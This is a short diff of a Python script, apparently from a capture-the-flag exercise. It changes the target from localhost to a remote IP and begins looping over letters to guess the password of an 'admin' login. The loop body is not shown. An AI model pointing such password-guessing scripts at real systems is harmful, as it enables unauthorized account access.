@@ -1,7 +1,7 @@
 import requests as r
 import string
 
-TARGET = "http://localhost:1337/?username=admin&password={}"
+TARGET = "http://20.17.162.114:1337/?username=admin&password={}"
 charset = string.ascii_letters
 
 for i in charset:
